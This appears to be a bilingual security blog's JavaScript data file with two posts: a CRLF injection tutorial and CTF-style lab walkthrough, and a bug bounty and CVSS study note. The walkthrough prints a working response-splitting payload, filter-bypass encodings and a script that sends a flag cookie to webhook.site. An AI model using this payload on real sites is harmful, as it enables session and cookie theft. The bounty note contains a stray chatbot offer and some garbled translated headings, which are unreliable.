window.postsData = [
  {
    id: "crlf-injection",
    href: "posts/web/crlf-injection.html",
    title: {
      "en": "CRLF Injection",
      "zh": "CRLF 注入"
    },
    category: "web",
    categoryLabel: {
      "en": "Web",
      "zh": "Web"
    },
    description: {
      "en": "CRLF injection basics, attack surfaces, bypass techniques, and a practical lab walkthrough.",
      "zh": "CRLF 注入基础、常见攻击面、绕过方式与一篇带截图的实战记录。"
    },
    date: "2026-04-24",
    content: {
      "en": "A full note covering the nature of CRLF injection, common abuse patterns, and a practical cookie exfiltration walkthrough.",
      "zh": "完整梳理 CRLF 注入的本质、常见利用方式，以及一次获取管理员 Cookie 的实战过程。"
    },
    code: "%0D%0A%0D%0A",
    contentHtml: {
      en: String.raw`<p>CRLF (Carriage Return + Line Feed) is a control-character pair used to represent line breaks in network protocols:</p>
<ul>
<li><code>\r</code>: Carriage Return</li>
<li><code>\n</code>: Line Feed</li>
</ul>
<p>In HTTP, CRLF has <strong>structural meaning</strong>. It is not just ordinary text; it is used to:</p>
<ul>
<li>Separate one header from another</li>
<li>Separate headers from the response body</li>
</ul>
<blockquote>CRLF controls the structure of an HTTP message, not its content.</blockquote>
<hr/>
<h3>The Nature of CRLF Injection</h3>
<p>The essence of a CRLF injection vulnerability is that an attacker can insert newline characters into an HTTP message, break the original structure, and forge new protocol-level content.</p>
<p>In other words:</p>
<ul>
<li>Normal input is treated as data</li>
<li>Injected CRLF is treated as protocol syntax</li>
</ul>
<p>That is the core reason the vulnerability exists.</p>
<hr/>
<h3>A Basic Model</h3>
<p>Assume the server has logic like this:</p>
<pre><code>Location: /search?q=user_input</code></pre>
<p>If the user supplies:</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>The server response becomes:</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>What happened here is:</p>
<ul>
<li>The value was originally just a parameter</li>
<li>It was elevated into a new header</li>
</ul>
<p>This is a classic CRLF injection.</p>
<hr/>
<h3>Conditions for the Vulnerability</h3>
<ol>
<li>User input reaches the structure of an HTTP message, such as a header, status line, or response</li>
<li><code>\r</code> and <code>\n</code> are not filtered or encoded</li>
<li>The backend directly concatenates strings</li>
</ol>
<blockquote>User-controlled input is inserted directly into protocol structure.</blockquote>
<hr/>
<h3>Common Attack Types</h3>
<h4>Header Injection</h4>
<p>An attacker inserts new headers, for example:</p>
<ul>
<li>Set-Cookie</li>
<li>Location</li>
<li>Content-Type</li>
</ul>
<p>This can lead to:</p>
<ul>
<li>Cookie injection</li>
<li>Session hijacking</li>
<li>Manipulated redirects</li>
</ul>
<h4>HTTP Response Splitting</h4>
<p>By inserting:</p>
<pre><code>\r\n\r\n</code></pre>
<p>The attacker forcefully ends the current response and starts a new one:</p>
<pre><code>Normal response
\r\n\r\n
Forged response</code></pre>
<p>This can be used to:</p>
<ul>
<li>Inject HTML pages</li>
<li>Build XSS chains</li>
<li>Return malicious content</li>
</ul>
<h4>Web Cache Poisoning</h4>
<ul>
<li>Modify cached content through CRLF injection</li>
<li>Poison CDN or proxy caches</li>
<li>Make other users visit a malicious page</li>
<li>Achieve persistent impact</li>
</ul>
<h4>Request Smuggling (Advanced Abuse)</h4>
<p>CRLF can also act as a low-level primitive for:</p>
<ul>
<li>Injecting extra requests</li>
<li>Confusing frontend and backend parsers</li>
<li>Manipulating request queues</li>
</ul>
<p>These attacks are often combined with:</p>
<ul>
<li>Differences between HTTP/1.1 and HTTP/2</li>
<li>Inconsistent frontend/backend parsing behavior</li>
</ul>
<hr/>
<h3>Common Injection Points</h3>
<p>CRLF injection is not limited to a single sink. Common entry points include:</p>
<ul>
<li>URL parameters (GET)</li>
<li>POST parameters</li>
<li>HTTP headers such as <code>Referer</code> or <code>User-Agent</code></li>
<li>Redirect parameters such as <code>Location</code></li>
<li>Logging systems (log injection)</li>
</ul>
<hr/>
<h3>Encoding and Bypass</h3>
<p>In practice, many systems try to filter <code>\r\n</code>, so bypass techniques are often needed.</p>
<h4>URL Encoding</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>Double Encoding</h4>
<pre><code>%250d%250a</code></pre>
<h4>Variant Techniques</h4>
<ul>
<li>Using only LF when a system filters only CR</li>
<li>Abusing parsing differences between layers</li>
<li>Using special HTTP/2 header constructions</li>
</ul>
<hr/>
<h3>Relationship with XSS and CSRF</h3>
<p>CRLF itself is not always the final exploit. It is more like a primitive.</p>
<p>It can be used as:</p>
<ul>
<li>A trigger for XSS by injecting HTML or JavaScript</li>
<li>Support for CSRF by influencing headers or cookies</li>
<li>A foundation for request smuggling</li>
</ul>
<blockquote>CRLF is control at the protocol layer, while XSS is control at the browser execution layer.</blockquote>
<hr/>
<h3>Attack-Chain Perspective</h3>
<p>A full attack chain often looks like this:</p>
<pre><code>CRLF injection
→ Control HTTP structure
→ Insert malicious headers or response content
→ Trigger cache, browser, or backend behavior
→ Reach the final impact (XSS, privilege escalation, data exposure)</code></pre>
<hr/>
<h3>Practical Walkthrough</h3>
<p>This was a site that allowed online reports. Clicking <code>REPORT</code> opened the report page. The objective was to obtain the administrator's cookie, which contained the flag.</p>
<img alt="Target application landing page" src="assets/posts/crlf-injection/Pasted image 20260423235305.png"/>
<img alt="Report page" src="assets/posts/crlf-injection/Pasted image 20260423220226.png"/>
<p>Enter some arbitrary content and then intercept the request with Burp Suite.</p>
<img alt="Burp Suite intercepted request" class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png"/>
<p>The page only returned <code>reported</code>, without anything particularly interesting.</p>
<img alt="Reported response page" src="assets/posts/crlf-injection/Pasted image 20260423235353.png"/>
<p>First, use CRLF injection in the <code>name</code> field to split the response with the following payload:</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>This is equivalent to <code>\r\n\r\n</code>, and it does the following:</p>
<ul>
<li>Ends the current header line</li>
<li>Creates an additional blank line</li>
<li>Forcefully terminates the response headers</li>
<li>Pushes attacker-controlled content into the response body</li>
<li>Makes the browser render subsequent content as HTML</li>
<li>Allows the script inside <code>iframe srcdoc</code> to execute</li>
<li>Triggers a request to the webhook after the script runs</li>
</ul>
<p>Next, use the following content in the <code>content</code> field:</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Because the response headers were terminated early through the <code>name</code> field, and that field was reflected into the header section on the target server, we could recover the cookie by matching it from the rendered page.</p>
<p>The payload can then be shortened into a single line:</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>Finally, URL-encode the key characters:</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img alt="Final encoded payload" src="assets/posts/crlf-injection/Pasted image 20260423235453.png"/>
<p>The webhook then successfully received the request.</p>
<img alt="Webhook request containing the flag" src="assets/posts/crlf-injection/Pasted image 20260423235547.png"/>`,
      zh: String.raw`<p>CRLF（Carriage Return + Line Feed）是一种在网络协议中用于表示换行的控制字符组合：</p>
<ul>
<li><code>\r</code>：回车（Carriage Return）</li>
<li><code>\n</code>：换行（Line Feed）</li>
</ul>
<p>在 HTTP 协议中，CRLF 具有<strong>结构性意义</strong>，它不是普通字符，而是用于：</p>
<ul>
<li>分隔 Header 与 Header</li>
<li>分隔 Header 与 Body</li>
</ul>
<blockquote>CRLF 控制的是 HTTP 报文的“结构”，而不是“内容”。</blockquote>
<hr/>
<h3>CRLF 注入的本质</h3>
<p>CRLF 注入漏洞的本质是：攻击者可以向 HTTP 报文中插入换行符，从而“打断原有结构”，并“伪造新的协议内容”。</p>
<p>换句话说：</p>
<ul>
<li>正常输入：被当成数据</li>
<li>注入 CRLF：被当成协议</li>
</ul>
<p>这就是漏洞成立的核心。</p>
<hr/>
<h3>一个基础模型</h3>
<p>假设服务器有如下逻辑：</p>
<pre><code>Location: /search?q=用户输入</code></pre>
<p>如果用户输入：</p>
<pre><code>test\r\nSet-Cookie: session=hacked</code></pre>
<p>服务器响应变成：</p>
<pre><code>Location: /search?q=test
Set-Cookie: session=hacked</code></pre>
<p>这里发生的事情是：</p>
<ul>
<li>原本只是参数</li>
<li>被提升为新的 Header</li>
</ul>
<p>这就是典型的 CRLF 注入。</p>
<hr/>
<h3>漏洞形成条件</h3>
<ol>
<li>用户输入进入 HTTP 报文结构中（Header / 状态行 / 响应）</li>
<li>没有对 <code>\r</code> 和 <code>\n</code> 进行过滤或编码</li>
<li>后端直接拼接字符串</li>
</ol>
<blockquote>用户输入被“直接拼进协议结构”。</blockquote>
<hr/>
<h3>常见攻击类型</h3>
<h4>Header 注入</h4>
<p>攻击者插入新的 Header，例如：</p>
<ul>
<li>Set-Cookie</li>
<li>Location</li>
<li>Content-Type</li>
</ul>
<p>效果包括：</p>
<ul>
<li>注入 Cookie</li>
<li>劫持会话</li>
<li>控制重定向行为</li>
</ul>
<h4>HTTP 响应拆分</h4>
<p>通过插入如下内容：</p>
<pre><code>\r\n\r\n</code></pre>
<p>强行结束当前响应，开始一个新的响应：</p>
<pre><code>正常响应
\r\n\r\n
伪造响应</code></pre>
<p>攻击者可以：</p>
<ul>
<li>注入 HTML 页面</li>
<li>构造 XSS</li>
<li>返回恶意内容</li>
</ul>
<h4>Web 缓存投毒</h4>
<ul>
<li>利用 CRLF 注入修改缓存内容</li>
<li>污染 CDN 或代理缓存</li>
<li>让其他用户访问恶意页面</li>
<li>实现持久攻击</li>
</ul>
<h4>请求走私（高阶利用）</h4>
<p>CRLF 可以作为基础构造：</p>
<ul>
<li>插入额外请求</li>
<li>干扰前后端解析</li>
<li>操控请求队列</li>
</ul>
<p>这类攻击通常结合：</p>
<ul>
<li>HTTP/1.1 与 HTTP/2 差异</li>
<li>Front-end / Back-end 不一致解析</li>
</ul>
<hr/>
<h3>常见注入位置</h3>
<p>CRLF 注入并不局限于某一个点，常见入口包括：</p>
<ul>
<li>URL 参数（GET）</li>
<li>POST 参数</li>
<li>HTTP Header（如 Referer / User-Agent）</li>
<li>重定向参数（Location）</li>
<li>日志系统（Log Injection）</li>
</ul>
<hr/>
<h3>编码与绕过</h3>
<p>现实中，很多系统会过滤 <code>\r\n</code>，因此需要绕过。常见方式包括：</p>
<h4>URL 编码绕过</h4>
<pre><code>%0d%0a
%0a
%0d</code></pre>
<h4>双重编码</h4>
<pre><code>%250d%250a</code></pre>
<h4>变体利用</h4>
<ul>
<li>只使用 LF（部分系统只过滤 CR）</li>
<li>利用解析差异（前后端不同处理）</li>
<li>HTTP/2 特殊 header 构造</li>
</ul>
<hr/>
<h3>与 XSS / CSRF 的关系</h3>
<p>CRLF 本身不是最终攻击，而是一个“原语”。</p>
<p>它可以作为：</p>
<ul>
<li>XSS 的触发器（注入 HTML / JS）</li>
<li>CSRF 的辅助（控制 Header / Cookie）</li>
<li>Smuggling 的基础</li>
</ul>
<blockquote>CRLF 是“协议层控制”，XSS 是“浏览器执行层控制”。</blockquote>
<hr/>
<h3>攻击链视角</h3>
<p>完整攻击链通常是：</p>
<pre><code>CRLF 注入
→ 控制 HTTP 结构
→ 插入恶意 Header / Response
→ 触发缓存 / 浏览器 / 后端逻辑
→ 实现最终利用（XSS / 权限提升 / 数据泄露）</code></pre>
<hr/>
<h3>实战表现</h3>
<p>这是一个可以在线举报的网站，点击 <code>REPORT</code> 会进入 report 页面。我们的目标是获得管理员的 Cookie，其中藏着 flag。</p>
<img alt="CRLF 注入靶场首页" src="assets/posts/crlf-injection/Pasted image 20260423235305.png"/>
<img alt="进入 report 页面后的界面" src="assets/posts/crlf-injection/Pasted image 20260423220226.png"/>
<p>随便输入一些内容，然后使用 Burp Suite 拦截请求。</p>
<img alt="Burp Suite 拦截到的请求" class="post-image-small" src="assets/posts/crlf-injection/Pasted image 20260423220515.png"/>
<p>页面只返回 <code>reported</code>，没有特别的内容。</p>
<img alt="reported 响应页面" src="assets/posts/crlf-injection/Pasted image 20260423235353.png"/>
<p>首先，在 <code>name</code> 中利用 CRLF 注入进行分割，内容如下：</p>
<pre><code>%0D%0A%0D%0A</code></pre>
<p>它等价于 <code>\r\n\r\n</code>，作用是：</p>
<ul>
<li>结束当前 header 行</li>
<li>再制造一个空行</li>
<li>强行结束响应头</li>
<li>让后续可控内容进入 response body</li>
<li>让浏览器把后续内容当作 HTML 渲染</li>
<li>使 <code>iframe srcdoc</code> 里的脚本能够执行</li>
<li>脚本执行后再请求 webhook</li>
</ul>
<p>其次是 <code>content</code> 中的内容：</p>
<pre><code class="language-html">&lt;iframe srcdoc="&lt;script&gt;
let t = top.document.body.innerText || '';

let m = t.match(/Set-Cookie: flag=([^;\n]+)/);

(new Image()).src = 'https://webhook.site/?raw=' +
    encodeURIComponent(m[1]) +
    '&amp;dec=' +
    encodeURIComponent(atob(m[1]));
&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>因为之前在 <code>name</code> 中提前结束了响应头，在目标服务器那边，<code>name</code> 被放进了 header 部分，所以我们可以利用匹配的方式来获取 Cookie。</p>
<p>将代码缩短为一行：</p>
<pre><code class="language-js">&lt;iframe srcdoc="&amp;lt;script&amp;gt;let t=top.document.body.innerText||'';let m=t.match(/Set-Cookie: flag=([^;\n]+)/);(new Image()).src='https://webhook.site/?raw='+encodeURIComponent(m[1])+'&amp;dec='+encodeURIComponent(atob(m[1]));&amp;lt;/script&amp;gt;"&gt;&lt;/iframe&gt;</code></pre>
<p>再将关键字进行 URL 编码：</p>
<pre><code>&lt;iframe+srcdoc%3d"%26lt%3bscript%26gt%3blet+t%3dtop.document.body.innerText||''%3blet+m%3dt.match(/Set-Cookie%3a+flag%3d([^%3b\n]%2b)/)%3b(new+Image()).src%3d'https%3a//webhook.site/%3fraw%3d'%2bencodeURIComponent(m[1])%2b'%26dec%3d'%2bencodeURIComponent(atob(m[1]))%3b%26lt%3b/script%26gt%3b"&gt;&lt;/iframe&gt;</code></pre>
<img alt="编码后的最终 payload" src="assets/posts/crlf-injection/Pasted image 20260423235453.png"/>
<p>在 Webhook 成功收到请求。</p>
<img alt="Webhook 收到带有 flag 的请求" src="assets/posts/crlf-injection/Pasted image 20260423235547.png"/>`
    }
  },
  {
    id: "bug-bounty-programs",
    href: "posts/pentest/bug-bounty-programs.html",
    title: {
      "en": "Bug Bounty Programs: Rules, Scope, and Report Writing",
      "zh": "漏洞赏金计划：规则、范围与报告写作"
    },
    category: "pentest",
    categoryLabel: {
      "en": "Penetration Testing",
      "zh": "渗透测试"
    },
    description: {
      "en": "Systematically review bug bounty program types, codes of conduct, project structure, report writing, CWE and CVSS.",
      "zh": "系统梳理漏洞赏金计划类型、行为准则、项目结构、报告写作、CWE 与 CVSS。"
    },
    date: "2026-05-07",
    content: {
      "en": "A structured learning note about bug bounty program models, policy scope, report quality, CWE, and CVSS.",
      "zh": "系统梳理漏洞赏金计划类型、行为准则、项目结构、报告写作、CWE 与 CVSS。"
    },
    code: "CWE + CVSS + clear reproduction steps",
    contentHtml: {
      en: String.raw`<h2>theory</h2>
<h3>Bug Bounty Program</h3>
<p>As mentioned in the summary of this module, bug bounty programs are often viewed as a crowdsourced security mechanism: individuals are recognized and compensated for discovering and reporting software vulnerabilities.</p>
<p>However, the significance of the bug bounty program is much more than just "finding vulnerabilities and getting bounties". Bug Bounty Program, also often called Vulnerability Rewards Program (VRP), is essentially a<strong>Continuous, proactive</strong>security testing mechanism. It is used to supplement code audits and penetration testing within the enterprise and further improve the organization's overall vulnerability management strategy. In other words, it is not a one-time security check, but incorporates continuous testing by external researchers into the enterprise's long-term security system.</p>
<p>This description of their bug bounty platform is apt:<strong>"Continuous testing, constant protection (Continuous testing, constant protection)"</strong>. This shows that bug bounty is not an add-on project after the development is completed, but a security link that can be seamlessly integrated into the existing software development life cycle of the enterprise. In other words, it transforms security testing from a phased behavior into a long-term mechanism.</p>
<hr/>
<h3>Bug Bounty Program Types</h3>
<p>Bug bounty programs can be mainly divided into<strong>private plan</strong>and<strong>public plan</strong>Two categories.</p>
<p>Private bug bounty programs are not open to the public. Researchers can participate in such projects only after receiving a specific invitation. Most bug bounty programs are initially launched in a private format so that companies can gradually adapt to the process of receiving, classifying and processing vulnerability reports before opening them up to the wider security community. Generally, whether a researcher can obtain an invitation to a private project is closely related to his or her past performance, the stability of valid vulnerability submissions, and whether there is a record of violations. Platforms like HackerOne will issue invitations based on a series of criteria. Some programs even require participants to pass a background check.</p>
<p>The public bug bounty program is open to the entire hacker community, and any qualified researcher can participate in testing and reporting vulnerabilities. This model has wider coverage and can draw on more external researchers to find problems, but it also requires higher processing capabilities of the company.</p>
<p>In addition, there is another<strong>Parent/Child Programs</strong>. Under this model, the parent company and its subsidiaries share the same bonus pool and the same cybersecurity team. If a subsidiary launches its own bug bounty program, the program will be linked to the parent program. This design facilitates group companies to uniformly manage vulnerability processing and reward distribution.</p>
<p>There is another very important conceptual distinction here:<strong>Bug Bounty Program (BBP)</strong> and<strong>Vulnerability Disclosure Program (VDP)</strong> Cannot be mixed. The Vulnerability Disclosure Program (VDP) simply tells outsiders how to submit information to the organization if you discover a vulnerability. It does not necessarily provide a bonus per se. The Bug Bounty Program (BBP) goes a step further: it not only encourages third parties to proactively discover and report vulnerabilities, but also provides monetary rewards as incentives. Simply put,<strong>VDP solves "how to apply", and BBP solves "what are the incentives for applying"</strong>. The two are related, but not the same thing.</p>
<hr/>
<h3>Bug Bounty Program Code of Conduct</h3>
<p>Bug bounty hunters’ violation records will always be taken into consideration, so it is critical to strictly abide by the Code of Conduct of each bug bounty project or platform. This is not a formality, nor is it something that can be "just glanced at". On the contrary, taking the time to read these rules carefully will directly affect your ability to submit reports efficiently, safely, and professionally.</p>
<p>The code of conduct not only stipulates how participants should behave, but also helps researchers more clearly understand the expectations of project parties, thereby reducing misunderstandings, avoiding crossing the line, and improving the quality of vulnerability reports. Many novices tend to only focus on technical details and ignore project rules. As a result, the loopholes are fine, but the process is overturned, which is a big loss.</p>
<p>If you want to become a mature, long-term sustainable bug bounty hunter, you must<strong>Professionalism</strong>and<strong>technical ability</strong>strike a balance between. It’s not enough just to dig holes, nor to just write polite emails. Both are indispensable. The article also recommends readers to check HackerOne's code of conduct to familiarize themselves with the writing and requirements of such documents. This suggestion is very practical, because although the rules of many platforms are worded differently, the underlying logic is similar: don’t mess around, don’t cross the line, and follow the rules.</p>
<hr/>
<h3>Bug Bounty Program Structure</h3>
<p>Next, the article begins by describing what a bug bounty program typically looks like. It recommends that readers go to HackerOne's project list to view specific examples, such as Alibaba BBP and Amazon Vulnerability Research Program, and focus on reading them<strong>Policy</strong>part.</p>
<p>According to HackerOne, the Policy section is where organizations explain project details to hackers. This is where companies typically publish vulnerability disclosure policies, telling researchers how they want to receive vulnerability information, which products or services are allowed to be tested, and what is within the scope of testing. Typically, these scopes are defined by domain names, IP ranges, web applications, or specific App Store / Play Store applications.</p>
<p>A typical bug bounty program usually contains the following elements: It will describe the SLA for the vendor's response, that is, when and how the vendor will respond to reports; it will describe the access methods required for research testing, such as how to create a test account; it will stipulate eligibility criteria, such as "you must be the first to submit the vulnerability" to receive the reward; it will provide a responsible disclosure policy to agree on the disclosure timeline and coordination process to ensure user safety; and it will define the rules of participation (Rules of Engagement, Scope, Out of Scope, Reporting Format, Rewards, Safe Harbor, Legal Terms and Conditions, and Contact Information.</p>
<p>On HackerOne, these are usually included in the Policy section of each project. The point here is clear:<strong>Be sure to read program descriptions and policies carefully and don’t take anything for granted.</strong>A lot of back and forth and wasted time are not at all because of technical incompetence, but because the rules were not understood clearly at the beginning. In bug bounty, time is indeed important. Whoever submits first and who submits in a more standardized manner will affect the results. This field is a bit like fighting monsters to get the first kill, but the rules are more annoying than the dungeon mechanism. If you don't read it clearly, it's easy to work in vain.</p>
<hr/>
<h3>Find bug bounty programs</h3>
<p>An excellent online resource recommended in this article for finding a suitable bug bounty program is<strong>HackerOne Directory</strong>. This directory can help researchers find bug bounty programs that they are interested in, and can also be used to find the vulnerability reporting contact information of certain organizations so that you can report the problems you find in a compliant and ethical manner.</p>
<p>In other words, this directory is not only suitable for people who want to "take the initiative to find projects to do", but also for those who accidentally discover a loophole in an organization during daily research and want to report it legally. It serves as both a project entry point and a source of information for responsible disclosure.</p>
<hr/>
<h3>Summarize</h3>
<p>The core meaning of this part can be summarized as follows: the bug bounty program is not just a simple mechanism of "discovering vulnerabilities in exchange for bonuses", but an important component of the enterprise's ongoing security governance system. It can be divided into two categories: private and public, and sometimes there is a parent-child project structure. At the same time, a clear distinction must be made between BBP and VDP, with the former carrying reward incentives and the latter primarily being a disclosure channel.</p>
<p>For participants, what really matters is not just technical level, but also whether they understand and abide by the project rules. Codes of conduct, scope, reporting requirements, and legal provisions may not seem exciting, but they often determine whether you can continue doing it smoothly and long-term. Finally, platform directories like the HackerOne Directory are a great resource for finding entries for projects and legitimate reports.</p>
<p>If you want, I can continue to organize this content into<strong>More like a test note version</strong>, that is, the shorter and easier-to-memorize Markdown.</p>
<h2>How to write a good vulnerability report</h2>
<p>This part mainly talks about:<strong>How to write a good vulnerability report, and why CWE and CVSS are used to describe vulnerabilities.</strong></p>
<p>A good vulnerability report must first do<strong>Clear, concise and reproducible</strong>. In other words, the report cannot just say "there is a vulnerability here", but should allow the security team or triage team to quickly understand the problem, understand the impact, and reproduce the vulnerability step by step according to the steps you provide. It is especially important that the report must clearly describe the process of reproducing the vulnerability. Otherwise, even if you do find a high-value vulnerability, the other party may delay processing or even directly lower the priority because it cannot be reproduced.</p>
<p>The article also specifically mentions that if you are dealing with a company with low security maturity, you cannot just pile on technical terms. You need to translate technical issues into business language that is easier to understand and let the other party understand the actual risks that this vulnerability will bring. Because many times, what really drives the repair is not "this is a XX vulnerability", but "this vulnerability will lead to customer data leakage, backend takeover, and business interruption."</p>
<hr/>
<h3>What a good vulnerability report should contain</h3>
<p>A high-quality vulnerability report usually contains the following core elements, although the order of these elements is not necessarily fixed.</p>
<p>first is<strong>Vulnerability title</strong>. The title should be as clear as possible, preferably directly reflecting the type of vulnerability, affected location, and impact. For example, affected domain names, parameters, interfaces or function points. The title is not a decoration, but an entrance for others to judge the nature of the problem at first glance.</p>
<p>then<strong>CWE and CVSS scores</strong>. CWE is used to indicate what type of security vulnerability this belongs to, and CVSS is used to quantify the severity of the vulnerability. Their value lies in allowing vulnerability characteristics and risk levels to be expressed in a standardized way, rather than relying solely on subjective descriptions.</p>
<p>followed by<strong>Vulnerability description</strong>. The focus of this part is to explain why the vulnerability exists, that is, to help the other party understand the root cause, not just the phenomenon.</p>
<p>followed by<strong>POC (proof of concept/reproduction steps)</strong>. This is one of the most critical parts of the report and needs to be clear, concise, and repeatable. If others follow your steps, they should be able to see the effect of the vulnerability stably. Written like The Riddler, it's easy to turn things into technical cross talk.</p>
<p>then<strong>impact analysis</strong>. This is not just to simply write "may be risky", but to explain what the attacker can do after fully exploiting the vulnerability, what business consequences it will cause, and what the maximum damage is. Good impact descriptions usually include both technical and business impacts.</p>
<p>finally<strong>Repair suggestions</strong>. The article says that this is optional in bug bounty projects and is not necessarily required, but if you can provide reasonable repair suggestions, the overall report quality will be higher and it will be easier to reflect professionalism.</p>
<p>Overall,<strong>Readable, clearly formatted reports can significantly reduce relapse and triage time</strong>. This is critical because in a bug bounty scenario, time is currency, and the easier the report is to process, the easier it is for you to be efficiently confirmed.</p>
<hr/>
<h3>Why use CWE vs CVSS</h3>
<p>This section explains why CWE and CVSS are often written in vulnerability reports.</p>
<h4>what is</h4>
<p>CWE, full name<strong>Common Weakness Enumeration</strong>, that is<strong>Common vulnerability enumeration</strong>. MITER defines it as a community-maintained list of software and hardware vulnerability types. It is equivalent to a unified language used to describe the nature of the weaknesses behind vulnerabilities, such as improper input validation, lack of access control, command injection, etc.</p>
<p>It has several functions: First, it facilitates unified communication, so that different companies, platforms, and researchers can use the same labels to understand problems; Second, it serves as a reference standard for security tools; Third, it helps with vulnerability identification, mitigation, and prevention.</p>
<p>The article also reminds: If you are facing<strong>vulnerability chain</strong>, then priority should be given to<strong>Initial vulnerability</strong>The relevant CWE, rather than choosing the one corresponding to the subsequent effect. This point is very subtle, but very practical.</p>
<h4>what is</h4>
<p>CVSS, full name<strong>Common Vulnerability Scoring System</strong>, that is<strong>Common Vulnerability Scoring System</strong>. It is a standard used by many organizations around the world to measure vulnerability severity.</p>
<p>Simply put, CWE is more like answering:<strong>"What type of question is this?"</strong></p>
<p>And CVSS is more like answering:<strong>"How serious is this problem?"</strong></p>
<p>So these two things often appear together, one is responsible for classification and the other is responsible for grading.</p>
<hr/>
<h3>Use the CVSS calculator</h3>
<p>This part begins<strong>CVSS v3.1 Calculator</strong> How to use it and explain the main focus here<strong>Base Score</strong>.</p>
<p>Each dimension is essentially an assessment of: how the vulnerability is exploited, whether it is difficult to exploit, what permissions are required, and whether the impact is significant.</p>
<h4>1. Attack Vector</h4>
<p>This indicator indicates how the attacker exploited the vulnerability.</p>
<ul><li><strong>Network (N)</strong>: Remote utilization through the network.</li></ul>
<ul><li><strong>Adjacent (A)</strong>: Must be on the same physical or logical network as the target, such as the same LAN or the same VPN.</li></ul>
<ul><li><strong>Local (L)</strong>: You must access the target system locally, or log in through SSH or other methods to use it.</li></ul>
<ul><li><strong>Physical (P)</strong>: Requires physical access to the device.</li></ul>
<p>The answer to the question is here<strong>Adjacent (A)</strong>.</p>
<h4>2. Attack Complexity</h4>
<p>Indicates whether additional conditions need to be met before the vulnerability can be successfully exploited.</p>
<ul><li><strong>Low (L)</strong>: Basically no additional preparation is required, and the attacker can use it repeatedly directly.</li></ul>
<ul><li><strong>High (H)</strong>: Requires special preparation, additional conditions, or additional information gathering.</li></ul>
<h4>3. Privileges Required (required permissions)</h4>
<p>Indicates what level of permissions an attacker must have before exploiting the vulnerability.</p>
<ul><li><strong>None (N)</strong>: No login or special permissions required.</li></ul>
<ul><li><strong>Low (L)</strong>: Requires normal user rights.</li></ul>
<ul><li><strong>High (H)</strong>: Requires administrator level permissions.</li></ul>
<h4>4. User Interaction</h4>
<p>Indicates whether the vulnerability must be exploited by relying on the victim to perform certain actions.</p>
<ul><li><strong>None (N)</strong>: The attacker can complete the exploit by himself.</li></ul>
<ul><li><strong>Required (R)</strong>: Triggered only after the user clicks, accesses, or opens certain content.</li></ul>
<h4>5. Scope (scope of influence)</h4>
<p>Indicates whether the impact after exploiting the vulnerability exceeds the original security boundary.</p>
<ul><li><strong>Unchanged (U)</strong>: The impact is limited to the current component or resources in the same security domain.</li></ul>
<ul><li><strong>Changed (C)</strong>: Exploiting a vulnerability in one component can affect another component. For example, a vulnerability on the server affects the browser.</li></ul>
<h4>6. Confidentiality</h4>
<p>Indicates the impact on information confidentiality after vulnerability exploitation.</p>
<ul><li><strong>None (N)</strong>: No impact.</li></ul>
<ul><li><strong>Low (L)</strong>: Some information is leaked, but the attacker cannot fully control what is obtained.</li></ul>
<ul><li><strong>High (H)</strong>: Serious leak, attacker can obtain a large amount of or even completely control readable information.</li></ul>
<h4>7. Integrity</h4>
<p>Indicates the impact on data credibility and accuracy after vulnerability exploitation.</p>
<ul><li><strong>None (N)</strong>: No impact.</li></ul>
<ul><li><strong>Low (L)</strong>: Data can only be modified to a limited extent, and the impact is light.</li></ul>
<ul><li><strong>High (H)</strong>: Key data or all data can be modified, with serious impact.</li></ul>
<h4>8. Availability</h4>
<p>Indicates the impact on system availability after vulnerability exploitation.</p>
<ul><li><strong>None (N)</strong>: No impact.</li></ul>
<ul><li><strong>Low (L)</strong>: Service performance is degraded, but service cannot be completely denied.</li></ul>
<ul><li><strong>High (H)</strong>: Services are seriously affected or even interrupted.</li></ul>
<hr/>
<h3>Example</h3>
<p>The article gives two examples to illustrate how to use CVSS 3.1 to conduct severity analysis of vulnerabilities.</p>
<h4>Example 1: Cisco ASA Buffer Overflow Vulnerability</h4>
<p>The CVSS 3.1 score for this vulnerability is<strong>9.8 (Critical, serious)</strong>. Because it can be exploited remotely through the network, no authentication or user interaction is required, the attack complexity is low, and it ultimately allows the attacker to obtain a reverse shell. So it was rated in the three dimensions of confidentiality, integrity, and availability.<strong>High</strong>. This type of vulnerability is basically a typical high-risk vulnerability of "remotely taking over the device". The score is very high and there is no suspense.</p>
<h4>Example 2: Stored XSS in administrator backend</h4>
<p>The CVSS 3.1 score for this vulnerability is<strong>5.5 (Medium, medium risk)</strong>. Although the attack can be launched through the network and the complexity is not high, the premise is that the attacker himself must already have administrator rights, that is to say<strong>Privileges Required = High</strong>. In addition, the impact of this vulnerability is mainly reflected in DOM access and application integrity to a certain extent. It cannot directly cause service unavailability, so Confidentiality and Integrity are<strong>Low</strong>, Availability is<strong>None</strong>. This shows that CVSS scoring does not just look at the vulnerability name.<strong>Seeing XSS doesn’t automatically mean you are at high risk.</strong>, but it depends on the specific utilization conditions and scope of influence.</p>
<hr/>
<h3>Examples of excellent reports</h3>
<p>This last section lists some excellent vulnerability reporting cases selected by HackerOne, such as:</p>
